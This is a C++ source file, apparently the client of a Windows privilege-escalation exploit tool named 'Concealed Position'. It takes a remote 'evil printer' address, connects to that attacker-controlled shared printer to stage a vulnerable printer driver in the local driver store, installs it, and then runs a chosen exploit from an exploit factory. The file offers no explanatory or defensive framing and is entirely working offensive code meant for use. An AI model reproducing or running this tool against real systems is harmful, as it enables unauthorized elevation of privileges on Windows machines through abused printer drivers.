#include <stdlib.h>
#include <Windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <set>

#include "popl.hpp"
#include "exploitfactory.h"

namespace
{
	const ExploitFactory s_exploits;

	const std::string catch_me("WVqtcQKfeIUxunX1jAadGwMiir5LacjHwN8tVl1Pr7AiwJnZCsik2TxHLZgGhErb");

	bool installDriverFromStore(const std::string& p_driver)
	{
		std::wstring wDriver(p_driver.begin(), p_driver.end());
		HRESULT hr = InstallPrinterDriverFromPackage(NULL, NULL, wDriver.c_str(), NULL, 0);
		if (FAILED(hr))
		{
			std::cout << "[-] Driver is not available." << std::endl;
			return false;
		}
		std::cout << "[+] Driver installed!" << std::endl;
		return true;
	}

	bool downloadDriver(const std::string& p_shared_printer)
	{
		bool return_value = false;
		std::wstring wPrinter(p_shared_printer.begin(), p_shared_printer.end());
		HANDLE hPrinter = NULL;
		PRINTER_DEFAULTS defaults = {};
		defaults.DesiredAccess = READ_CONTROL;

		std::cout << "[+] Call back to evil printer @ " << p_shared_printer << std::endl;
		if (OpenPrinter((LPWSTR)wPrinter.c_str(), &hPrinter, &defaults) == false)
		{
			std::cerr << "[-] Couldn't connect to the remote printer: " << GetLastError() << std::endl;
			return return_value;
		}

		BYTE data[1024] = { 0 };
		DWORD needed = 0;
		std::cout << "[+] Staging driver in driver store" << std::endl;
		if (GetPrinterDriver(hPrinter, NULL, 1, &data[0], 1024, &needed) == false)
		{
			if (GetLastError() == ERROR_UNKNOWN_PRINTER_DRIVER)
			{
				std::cout << "[+] Driver staged!" << std::endl;
				return_value = true;
			}
			else if (GetLastError() == ERROR_PRINTER_DRIVER_ALREADY_INSTALLED)
			{
				std::cout << "[?] Driver is already staged?" << std::endl;
				return_value = true;
			}
			else
			{
				std::cout << "[-] Failed to stage the driver: " << GetLastError() << std::endl;
			}
		}

		ClosePrinter(hPrinter);
		return return_value;
	}

	bool parseCLI(int p_argc, const char* p_argv[], std::string& p_shared_printer, std::shared_ptr<Exploit>& p_exploit_ptr)
	{
		popl::OptionParser op("CLI options");
		auto help = op.add<popl::Switch>("h", "help", "Display the help message");
		auto evil_address = op.add<popl::Value<std::string>>("r", "rhost", "The remote evil printer address");
		auto evil_printer = op.add<popl::Value<std::string>>("n", "name", "The remote evil printer name");
		auto exploit = op.add<popl::Value<std::string>>("e", "exploit", "The exploit to use");
		auto local_only = op.add<popl::Switch>("l", "local", "No remote printer. Local attack only.");
		op.parse(p_argc, p_argv);

		if (p_argc < 3 || help->is_set())
		{
			std::cout << op << std::endl;
			std::cout << "Exploits available:" << std::endl;

			const std::set<std::string>& exploits = s_exploits.getExploits();
			for (std::set<std::string>::iterator it = exploits.begin(); it != exploits.end(); ++it)
			{
				std::cout << "\t" << *it << std::endl;
			}
			return false;
		}

		if (!exploit->is_set())
		{
			std::cerr << "[-] Must provide an exploit." << std::endl;
			return false;
		}
		else
		{
			if (!s_exploits.availableExploit(exploit->value(0)))
			{
				std::cout << "[!] User provided exploit is invalid" << std::endl;
				return false;
			}

			p_exploit_ptr = s_exploits.createExploit(exploit->value(0));
		}

		if (local_only->is_set())
		{
			// try the attack without reaching out to an evil printer
			return true;
		}

		if (!evil_address->is_set())
		{
			std::cerr << "[-] Must provide an rhost." << std::endl;
			return false;
		}
		else
		{
			p_shared_printer.assign("\\\\");
			p_shared_printer.append(evil_address->value(0));
		}

		if (!evil_printer->is_set())
		{
			std::cerr << "[-] Must provide a printer name." << std::endl;
			return false;
		}
		else
		{
			p_shared_printer.append("\\");
			p_shared_printer.append(evil_printer->value(0));
		}

		return true;
	}
}

int main(int p_argc, const char* p_argv[])
{
	std::cout << " _______  _______  __    _  _______  _______  _______  ___      _______  ______  " << std::endl;
	std::cout << "|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      | " << std::endl;
	std::cout << "|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |" << std::endl;
	std::cout << "|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |" << std::endl;
	std::cout << "|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |" << std::endl;
	std::cout << "|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |" << std::endl;
	std::cout << "|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______| " << std::endl;
	std::cout << " _______  _______  _______  ___   _______  ___   _______  __    _                " << std::endl;
	std::cout << "|       ||       ||       ||   | |       ||   | |       ||  |  | |               " << std::endl;
	std::cout << "|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |               " << std::endl;
	std::cout << "|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |               " << std::endl;
	std::cout << "|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |               " << std::endl;
	std::cout << "|   |    |       | _____| ||   |   |   |  |   | |       || | |   |               " << std::endl;
	std::cout << "|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    client!    " << std::endl;
	std::cout << std::endl;

	std::string shared_printer;
	std::shared_ptr<Exploit> exploit_ptr;
	if (!parseCLI(p_argc, p_argv, shared_printer, exploit_ptr))
	{
		return EXIT_FAILURE;
	}

	// Attempt to install the driver. If it already exists we don't need the connect back silliness.
	std::cout << "[+] Checking if driver is already installed" << std::endl;
	if (installDriverFromStore(exploit_ptr->get_driver_name()) == false)
	{
		if (shared_printer.empty())
		{
			std::cout << "[!] Exiting" << std::endl;
			return EXIT_FAILURE;
		}
		if (!downloadDriver(shared_printer))
		{
			return EXIT_FAILURE;
		}

		std::cout << "[+] Installing the staged driver" << std::endl;
		if (!installDriverFromStore(exploit_ptr->get_driver_name()))
		{
			return EXIT_FAILURE;
		}
	}

	if (!exploit_ptr->do_exploit())
	{
		std::cout << "[-] Exploit failed!" << std::endl;
	}

	return EXIT_SUCCESS;
}
